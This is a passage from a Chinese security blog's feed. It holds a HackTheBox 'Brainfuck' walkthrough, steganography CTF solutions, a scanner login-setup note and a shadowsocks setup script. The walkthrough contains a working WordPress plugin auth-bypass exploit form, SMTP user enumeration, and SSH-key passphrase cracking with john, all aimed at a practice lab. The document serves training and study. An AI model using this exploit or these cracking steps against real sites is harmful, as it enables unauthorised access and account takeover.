    <content type="html"><![CDATA[<p>为了节约时间，用工具辅助人工进行测试，在遇到数十个网站需要进行渗透测试的时候，使用自动化扫描工具是个明智的选择。</p><h2 id="awvs登陆扫描"><a href="#awvs登陆扫描" class="headerlink" title="awvs登陆扫描"></a>awvs登陆扫描</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-30-09/3.PNG" alt="3"></p><p>general &gt; site login<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-30-09/4.PNG" alt="4"></p><h2 id="appscan登陆扫描"><a href="#appscan登陆扫描" class="headerlink" title="appscan登陆扫描"></a>appscan登陆扫描</h2><p>扫描配置 &gt; 探索 &gt; 登录管理 &gt; 登录方法<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-30-09/5.PNG" alt="5"></p>]]></content>
    
    
    <categories>
      
      <category>scan</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Brainfuck靶机渗透实践-rsa算法和维吉尼亚解密</title>
    <link href="/2019/07/16/10-x/"/>
    <url>/2019/07/16/10-x/</url>
    
    <content type="html"><![CDATA[<p>hackthebox是一个在线的渗透平台，通过渗透获取邀请码，即可在这个平台上注册一个账号。</p><p>该平台的在线靶机一共20台，每周会下线一台靶机，如果靶机下线了呢，分数就会全部清空。而成功渗透靶机就能获取一定的分数，分数够了就能提升等级。</p><p>在线的靶机都是没有writeup的，所以你的等级很大程度可以证明你的渗透实战能力。</p><p>该平台一共7个用户等级，刚注册是等级Noob：</p><ol><li>Noob 无知者</li><li>script kiddle 脚本小子 </li><li>hacker 黑客</li><li>Pro hacker 专业黑客</li><li>Elite Hacker 精英黑客</li><li>Guru 大师</li><li>Omniscient （最高等级）无所不知者</li></ol><p>靶机的分数为20-50分</p><ol><li>20分-easy 简单</li><li>30分-medium 中等难度</li><li>40分-hard 困难的</li><li>50分-Insane 疯狂的</li></ol><p>下面介绍关于过期的机器<strong>Brainfuck</strong>的渗透过程，难度等级为hard。</p><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a><strong>扫描</strong></h2><p>用脚本扫描，好处是不用每次输入很多命令。运行以下脚本，输入IP：<code>10.10.10.17</code>，即可扫描udp和tcp的65535个端口，以及端口的版本。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-built_in">read</span> -p <span class="hljs-string">&quot;which ip? &quot;</span> ip<br>masscan -p1-65535,U:1-65535 <span class="hljs-variable">$&#123;ip&#125;</span> --rate=1000 -p1-65535,U:1-65535 -e tun0 &gt; ports<br><br>what=$(awk <span class="hljs-string">&#x27;NR&lt;=1 &#123;print $6&#125;&#x27;</span> ports)<br>ports=$(cat ports | awk -F <span class="hljs-string">&quot; &quot;</span> <span class="hljs-string">&#x27;&#123;print $4&#125;&#x27;</span> | awk -F <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | sort -n | tr <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-string">&#x27;,&#x27;</span> | sed <span class="hljs-string">&#x27;s/,$//&#x27;</span>)<br>nmap -Pn -sV -sC -p<span class="hljs-variable">$ports</span> <span class="hljs-variable">$&#123;what&#125;</span> -oA <span class="hljs-variable">$&#123;ip&#125;</span><br>nmap -Pn -sU -sV -sC -p<span class="hljs-variable">$ports</span> <span class="hljs-variable">$&#123;what&#125;</span> -oA <span class="hljs-variable">$&#123;ip&#125;</span>-udp.xml<br><br>nikto -h http://<span class="hljs-variable">$&#123;ip&#125;</span> &gt; nikto-<span class="hljs-variable">$&#123;ip&#125;</span>.txt<br></code></pre></div></td></tr></table></figure><p>以下是扫描结果：</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">Discovered <span class="hljs-keyword">open</span> port <span class="hljs-number">25</span>/tcp <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.17</span>                                     <br>Discovered <span class="hljs-keyword">open</span> port <span class="hljs-number">443</span>/tcp <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.17</span>                                    <br>Discovered <span class="hljs-keyword">open</span> port <span class="hljs-number">22</span>/tcp <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.17</span>                                     <br>Discovered <span class="hljs-keyword">open</span> port <span class="hljs-number">143</span>/tcp <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.17</span>                                    <br>Discovered <span class="hljs-keyword">open</span> port <span class="hljs-number">110</span>/tcp <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.17</span>      <br><br>PORT    STATE SERVICE  <span class="hljs-keyword">VERSION</span><br><br><span class="hljs-number">22</span>/tcp  <span class="hljs-keyword">open</span>  ssh      OpenSSH <span class="hljs-number">7.2</span>p2 Ubuntu <span class="hljs-number">4</span>ubuntu2<span class="hljs-number">.1</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br><br><span class="hljs-number">25</span>/tcp  <span class="hljs-keyword">open</span>  smtp     Postfix smtpd<br>|_smtp-commands: brainfuck, PIPELINING, SIZE <span class="hljs-number">10240000</span>, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, <span class="hljs-number">8</span>BITMIME, DSN, <br><br><span class="hljs-number">110</span>/tcp <span class="hljs-keyword">open</span>  pop3     Dovecot pop3d<br><br>|_pop3-capabilities: TOP UIDL CAPA RESP-CODES SASL(PLAIN) <span class="hljs-keyword">USER</span> PIPELINING AUTH-RESP-CODE<br><br><span class="hljs-number">143</span>/tcp <span class="hljs-keyword">open</span>  imap     Dovecot imapd<br><br>|_imap-capabilities: IDLE IMAP4rev1 LITERAL+ more listed have capabilities <span class="hljs-keyword">LOGIN</span>-REFERRALS <span class="hljs-keyword">ENABLE</span> ID OK post-<span class="hljs-keyword">login</span> Pre-<span class="hljs-keyword">login</span> SASL-IR AUTH=PLAINA0001<br><br><span class="hljs-number">443</span>/tcp <span class="hljs-keyword">open</span>  ssl/http nginx <span class="hljs-number">1.10</span><span class="hljs-number">.0</span> (Ubuntu)<br>|_http-<span class="hljs-keyword">server</span>-<span class="hljs-keyword">header</span>: nginx/<span class="hljs-number">1.10</span><span class="hljs-number">.0</span> (Ubuntu)<br>|_http-title: Welcome <span class="hljs-keyword">to</span> nginx!<br><br>| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR<br><br>| Subject Alternative <span class="hljs-type">Name</span>: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb<br>                             <br>Service <span class="hljs-keyword">Info</span>: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></div></td></tr></table></figure><h2 id="smtp（简单邮件传输协议）枚举存在用户"><a href="#smtp（简单邮件传输协议）枚举存在用户" class="headerlink" title="smtp（简单邮件传输协议）枚举存在用户"></a><strong>smtp（简单邮件传输协议）枚举存在用户</strong></h2><p><code>smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 10.10.10.17</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-16-10/1.PNG" alt="1"></p><h2 id="web分析"><a href="#web分析" class="headerlink" title="web分析"></a><strong>web分析</strong></h2><p>访问地址<code>https://10.10.10.17</code></p><figure class="highlight axapta"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs axapta">Welcome to nginx!<br>If you see <span class="hljs-keyword">this</span> page, the nginx web <span class="hljs-keyword">server</span> <span class="hljs-keyword">is</span> successfully installed and working<br></code></pre></div></td></tr></table></figure><p>nmap、nikto，都显示了域名：commonName=brainfuck.htb</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-16-10/3.PNG" alt="3"></p><p>同样也可以用sslyze查询域名。</p><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">sslyze --regular <span class="hljs-number">10.10</span>.<span class="hljs-number">10.17</span> &gt; <span class="hljs-regexp">/root/</span>Desktop<span class="hljs-regexp">/10.10.10.17/</span>domain<br>cat <span class="hljs-regexp">/root/</span>Desktop<span class="hljs-regexp">/10.10.10.17/</span>domain | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;Name&quot;</span><br></code></pre></div></td></tr></table></figure><ul><li>用burp，将host修改为brainfuck.htb，可以看到nginx 默认配置页面变成了另一个页面。<br>访问<a href="https://brainfuck.htb/%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0wordpress%E7%AB%99">https://brainfuck.htb/，可以看到wordpress站</a></li></ul><p>修改/etc/hosts<br><code>echo 10.10.10.17 brainfuck.htb sup3rs3cr3t.brainfuck.htb www.brainfuck.htb&gt;&gt; /etc/hosts</code></p><h4 id="分析三个域名的网页"><a href="#分析三个域名的网页" class="headerlink" title="分析三个域名的网页"></a>分析三个域名的网页</h4><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-16-10/4.PNG" alt="4"></p><p>访问：<a href="https://brainfuck.htb/%EF%BC%8Chttps://www.brainfuck.htb%EF%BC%8Chttps://sup3rs3cr3t.brainfuck.htb">https://brainfuck.htb/，https://www.brainfuck.htb，https://sup3rs3cr3t.brainfuck.htb</a></p><h5 id="wordpress扫描器——wpscan"><a href="#wordpress扫描器——wpscan" class="headerlink" title="wordpress扫描器——wpscan"></a><strong>wordpress扫描器——wpscan</strong></h5><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">wpscan</span> --url https://brainfuck.htb/ --disable-tls-checks<br><br><span class="hljs-attribute">WordPress</span> version <span class="hljs-number">4</span>.<span class="hljs-number">7</span>.<span class="hljs-number">3</span> <br><br><span class="hljs-attribute">WP</span> Support Plus Responsive Ticket System &lt;= <span class="hljs-number">8</span>.<span class="hljs-number">0</span>.<span class="hljs-number">7</span> - Remote Code Execution (RCE)<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-16-10/5.PNG" alt="5"></p><p>该扫描器发现了4个插件漏洞。主要是“WP Support Plus Responsive Ticket System”</p><h5 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a><strong>searchsploit</strong></h5><p>searchsploit WP Support Plus Responsive</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-16-10/2.PNG" alt="2"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">searchsploit -m exploits<span class="hljs-regexp">/php/</span>webapps/<span class="hljs-number">34589</span>.txt<br>searchsploit -m exploits<span class="hljs-regexp">/php/</span>webapps/<span class="hljs-number">41006</span>.txt<br>searchsploit -m exploits<span class="hljs-regexp">/php/</span>webapps/<span class="hljs-number">40939</span>.txt<br></code></pre></div></td></tr></table></figure><p>经过测试，找到了可用exp</p><p>wordpress插件“WP Support Plus Responsive Ticket System 7.1.3”提权漏洞。<a href="https://www.exploit-db.com/exploits/41006">https://www.exploit-db.com/exploits/41006</a></p><p>你可以无需知道密码以任何用户名登陆，因为使用函数wp_set_auth_cookie()的方式不正确。</p><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>将以下表单，保存为exp.html</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">&lt;form <span class="hljs-keyword">method</span>=&quot;post&quot; action=&quot;https://brainfuck.htb/wp-admin/admin-ajax.php&quot;&gt;<br><br>Username: &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;text&quot; <span class="hljs-type">name</span>=&quot;username&quot; <span class="hljs-keyword">value</span>=&quot;admin&quot;&gt;<br><br>&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;hidden&quot; <span class="hljs-type">name</span>=&quot;email&quot; <span class="hljs-keyword">value</span>=&quot;sth&quot;&gt;<br><br>&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;hidden&quot; <span class="hljs-type">name</span>=&quot;action&quot; <span class="hljs-keyword">value</span>=&quot;loginGuestFacebook&quot;&gt;<br><br>&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;submit&quot; <span class="hljs-keyword">value</span>=&quot;Login&quot;&gt;<br><br>&lt;/form&gt;<br></code></pre></div></td></tr></table></figure><p>用python开启本地服务器</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-16-10/6.PNG" alt="6"></p><p>点击exp.html，跳转到一个表单，点击Login</p><p>稍等一会儿，然后访问wordpress的管理页面<code>https://brainfuck.htb/wp-admin</code>，发现我们进行漏洞利用成功了。</p><h2 id="获得web后台权限"><a href="#获得web后台权限" class="headerlink" title="获得web后台权限"></a><strong>获得web后台权限</strong></h2><p>登陆wordpress表单后，网站后台获得一个口令。<br> <code>orestis</code> | <code>kHGuERB29DNiNE</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-16-10/8.PNG" alt="8"></p><p>获得了一个口令，然后我们用这个口令登入143端口，这是IMAP服务。Internet Message Access Protocol（互联网邮件访问协议）</p><p>简便起见，我们使用图形化界面的邮件客户端。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-16-10/9.PNG" alt="9"></p><h4 id="配置IMAP客户端"><a href="#配置IMAP客户端" class="headerlink" title="配置IMAP客户端"></a>配置IMAP客户端</h4><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-16-10/10.PNG" alt="10"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-16-10/12.PNG" alt="12"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-16-10/13.PNG" alt="13"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-16-10/14.PNG" alt="14"></p><figure class="highlight avrasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span> orestis<br><span class="hljs-symbol">password:</span> kIEnnfEKJ<span class="hljs-meta">#9UmdO</span><br></code></pre></div></td></tr></table></figure><p>得到了一个论坛的口令，在论坛<code>https://sup3rs3cr3t.brainfuck.htb/</code>以该口令登陆，然后看到了一些编码后的信息。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-16-10/15.PNG" alt="15"></p><p>搜索Vigenere加密（维吉尼亚密码），在在线网站<a href="http://www.dcode.fr/vigenere-cipher%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86">http://www.dcode.fr/vigenere-cipher进行解密</a></p><h4 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h4><p>在一个<a href="https://zh.wikipedia.org/wiki/%E5%87%B1%E6%92%92%E5%AF%86%E7%A2%BC" title="凯撒密码">凯撒密码</a>中，字母表中的每一字母都会作一定的偏移，例如偏移量为3时，A就转换为了D、B转换为了E……而维吉尼亚密码则是由一些偏移量不同的恺撒密码组成。</p><p>为了生成密码，需要使用<a href="https://zh.wikipedia.org/wiki/%E8%A1%A8%E6%A0%BC%E6%B3%95" title="表格法">表格法</a>。这一表格包括了26行字母表，每一行都由前一行向左偏移一位得到。具体使用哪一行字母表进行编译是基于密钥进行的，在过程中会不断地变换。</p><p>破译维吉尼亚密码的关键在于它的密钥是循环重复的。如果我们知道了密钥的长度，那密文就可以被看作是交织在一起的凯撒密码，而其中每一个都可以单独破解。使用卡西斯基试验和弗里德曼试验来得到密钥的长度。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-16-10/16.PNG" alt="16"></p><p>将图中的字符串解密，得到了一个http地址，下载文件后，发现是ssh密钥。<br><code>https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa</code></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> <span class="hljs-number">400</span> id_rsa<br><span class="hljs-attribute">ssh</span> -i id_rsa orestis@<span class="hljs-number">10.10.10.17</span><br></code></pre></div></td></tr></table></figure><p>尝试连接，发现需要密码。于是我们用john爆破密码。</p><p><a href="http://grayhat.shoutwiki.com/wiki/SSH_tricks">http://grayhat.shoutwiki.com/wiki/SSH_tricks</a>，这篇blog提到的方法，可以破解id_rsa的密钥。</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">wget https://raw.githubusercontent.com/stricture/hashstack-<span class="hljs-keyword">server</span>-plugin-jtr/master/scrapers/sshng2john.py<br><br>python sshng2john.py id_rsa &gt; id_rsa.<span class="hljs-keyword">encrypted</span><br><br>john id_rsa.<span class="hljs-keyword">encrypted</span> <span class="hljs-comment">--wordlist=/usr/share/wordlists/rockyou.txt</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-16-10/17.PNG" alt="17"></p><h2 id="获得user权限"><a href="#获得user权限" class="headerlink" title="获得user权限"></a><strong>获得user权限</strong></h2><p>接下来准备提取root权限，我们看到目录下，有一个c代码，将<code>/root/root.txt</code>（这个是我们想要获取的flag）进行编码，生成了debug.txt<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-16-10/18.PNG" alt="18"></p><p>在这里，我们需要知道一点RSA算法。 <a href="https://zh.wikipedia.org/wiki/RSA">https://zh.wikipedia.org/wiki/RSA</a></p><p>跟我复习一下RSA算法的原理。<br>P、Q是随意选择的两个质数（越大越安全）<br>e是随意选择的一个整数，e与m（m与p和q相关）互为质数。<br>n是pq的乘积。</p><p>公布的数是n和e，其他的数字作为私钥不公布。<br>注意，这里总共提到了四个数PQNE，PQ是随意选择的质数，</p><p>m与PQ相关，e与m相关，n是PQ之积</p><p>也就是说只有三个数是规定的，pqe</p><p>而在代码中，将pqe这三个数写入了debug.txt</p><figure class="highlight isbl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs isbl"><span class="hljs-variable">debug.write</span>(<span class="hljs-function"><span class="hljs-title">str</span>(<span class="hljs-variable">p</span>)+<span class="hljs-string">&#x27;\n&#x27;</span>)</span><br><span class="hljs-variable">debug.write</span>(<span class="hljs-function"><span class="hljs-title">str</span>(<span class="hljs-variable">q</span>)+<span class="hljs-string">&#x27;\n&#x27;</span>)</span><br><span class="hljs-variable">debug.write</span>(<span class="hljs-function"><span class="hljs-title">str</span>(<span class="hljs-variable">e</span>)+<span class="hljs-string">&#x27;\n&#x27;</span>)</span><br></code></pre></div></td></tr></table></figure><p>于是我们来查看一下debug.txt</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-16-10/19.PNG" alt="19"></p><p>写一段<a href="https://raw.githubusercontent.com/Whale3070/ctf-coding/master/rsa.py">python代码</a>，将output.txt “Encrypted Password:”这一段密码解密，通过参数pqe（debug.txt给出）以及rsa算法解密，即可得到flag。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>图片隐写（一）</title>
    <link href="/2019/07/11/05-x/"/>
    <url>/2019/07/11/05-x/</url>
    
    <content type="html"><![CDATA[<h1 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h1><h2 id="lsb"><a href="#lsb" class="headerlink" title="lsb"></a>lsb</h2><p><a href="http://www.wechall.net/challenge/training/stegano/LSB/index.php">题目地址</a></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-11-05/1.PNG" alt="1"></p><p>SSAINISHPBOB</p><hr><h2 id="复杂的QR-code"><a href="#复杂的QR-code" class="headerlink" title="复杂的QR_code"></a>复杂的QR_code</h2><p><a href="http://www.shiyanbar.com/ctf/1856">题目地址</a></p><p><a href="http://ctf5.shiyanbar.com/stega/QR_code.png">http://ctf5.shiyanbar.com/stega/QR_code.png</a></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">binwalk -e QR_code<span class="hljs-selector-class">.png</span><br>fcrackzip -<span class="hljs-selector-tag">b</span> -l <span class="hljs-number">4</span>-<span class="hljs-number">4</span> -u <span class="hljs-number">4</span>number<span class="hljs-selector-class">.txt</span><span class="hljs-selector-class">.zip</span> -v -c <span class="hljs-number">1</span><br>unzip <span class="hljs-number">4</span>number<span class="hljs-selector-class">.txt</span><span class="hljs-selector-class">.zip</span><br><br>-b爆破，-l说明密码长度，-u是文件，-v是详细输出，-c是密码字典类型<br></code></pre></div></td></tr></table></figure><h2 id="FIVE1"><a href="#FIVE1" class="headerlink" title="FIVE1"></a><a href="http://ctf5.shiyanbar.com/stega/FIVE1/1111110000000000.jpg">FIVE1</a></h2><p>binwalk 1111110000000000.jpg</p><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc"><span class="hljs-section">DECIMAL   HEX       DESCRIPTION</span><br><span class="hljs-section">-------------------------------------------------------------------------------------------------------</span><br>7395      0x1CE3    Zip archive data, at least v2.0 to extract, compressed size: 32506, uncompressed size: 45602, name: &quot;hacker.jpeg&quot;  <br>40073     0x9C89    End of Zip archive <br></code></pre></div></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">fcrackzip</span> -b -u -l <span class="hljs-number">1</span>-<span class="hljs-number">5</span> hacker.jpeg.zip<br><br><span class="hljs-attribute">cat</span> hacker.jpeg<br><br><span class="hljs-attribute">echo</span> <span class="hljs-string">&quot;LS0uLi4gIC4tICAuLi4uLiAgLS0uLi4gIC4tICAuLi4uLiAgLi0gIC0tLi4uICAuLi4uLSAgLi4uLS0gIC0tLS4uICAtLS0tLiAgLi4uLi0gIC4tICAtLS0tLSAgLiAg&quot;</span> &gt;<span class="hljs-number">1</span>.txt<br><br><span class="hljs-attribute">cat</span> <span class="hljs-number">1</span>.txt | base<span class="hljs-number">64</span> -d<br></code></pre></div></td></tr></table></figure><p><a href="http://ctf.ssleye.com/morse.html">摩斯电码在线解码</a></p><p>得到<code>7a57a5a743894a0e</code></p><p><a href="https://www.cmd5.com/">https://www.cmd5.com/</a></p><h2 id="Simply-Red"><a href="#Simply-Red" class="headerlink" title="Simply Red"></a><a href="http://www.wechall.net/challenge/anto/simply_red/index.php">Simply Red</a></h2><p>给出了一个红色的图片，图中是Optimus prime。擎天柱</p><p>prime是素数的意思。</p><p>当该矩阵的某个位置的数值较大，则表示该处对应调色板使用的颜色就越”白/浅“，而越小则对应调色板使用颜色越“黑/深”。8bit的图像，对应的矩阵元素取值为0-255</p><p>用python代码，提取出素数的像素点，保存为新的图片，即可获得flag.</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shadowsocks一键运行script</title>
    <link href="/2019/07/10/10-x/"/>
    <url>/2019/07/10/10-x/</url>
    
    <content type="html"><![CDATA[<p>起因是，隔了几个月再配置ss，总是忘了怎么配置。所以记录一下。</p><p>首先你要有一个虚拟专用服务器（VPS），然后在终端输入以下命令。运行脚本后，输入配置信息，即可完成shadowsocks的配置。</p><p>在本地shadowsocks配置相同的用户名密码等信息，即可访问google。</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">wget –<span class="hljs-keyword">no</span>-check-certificate http<span class="hljs-variable">s:</span>//raw.githubusercontent.<span class="hljs-keyword">com</span>/teddysun/shadowsocks_install/master/shadowsocks-libev-debian.<span class="hljs-keyword">sh</span><br><br>chmod +<span class="hljs-keyword">x</span> shadowsocks-libev-debian.<span class="hljs-keyword">sh</span><br><br>./shadowsocks-libev-debian.<span class="hljs-keyword">sh</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | tee shadowsocks-libev-debian.<span class="hljs-built_in">log</span><br></code></pre></div></td></tr></table></figure><p>注意，下面第二项，需要是常见端口，如果是不常见的端口，很有可能被墙封掉。我配置了两次，第一次就是<code>shadowsocks-libev-debian.sh</code>默认配置的13456端口，但是不能访问google，第二次改为443就好了。</p><figure class="highlight oxygene"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs oxygene">Your Server IP        :  保密<br>Your Server Port      :  <span class="hljs-number">443</span><br>Your Password         :  保密<br>Your Encryption <span class="hljs-function"><span class="hljs-keyword">Method</span>:</span>  X<br></code></pre></div></td></tr></table></figure><p><code>ps -ef | grep &quot;shadow*&quot;</code>可以查看已经加入开机自启。</p><p>为了安全起见，Your Password 需要经常更换哦。</p><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>2020.2.1 github上原作者的shadowsocks项目已经删除，还好我服务器上有<a href="https://raw.githubusercontent.com/Whale3070/ctf-coding/master/network.sh">备份</a><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-30-06/10.PNG">,2020.02.27 测试，该脚本无效了。</p><p><a href="https://github.com/itrump/ssfree/blob/master/cn/ss_windows_obfs_%E6%95%99%E7%A8%8B.md">https://github.com/itrump/ssfree/blob/master/cn/ss_windows_obfs_%E6%95%99%E7%A8%8B.md</a></p><h2 id="shadowsocksR"><a href="#shadowsocksR" class="headerlink" title="shadowsocksR"></a>shadowsocksR</h2><p>添加了加密和混淆功能。</p><p><a href="https://www.hijk.pw/shadowsockr-shadowsocksr-ssr-windows-client-download/">https://www.hijk.pw/shadowsockr-shadowsocksr-ssr-windows-client-download/</a></p>]]></content>
    
    
    <categories>
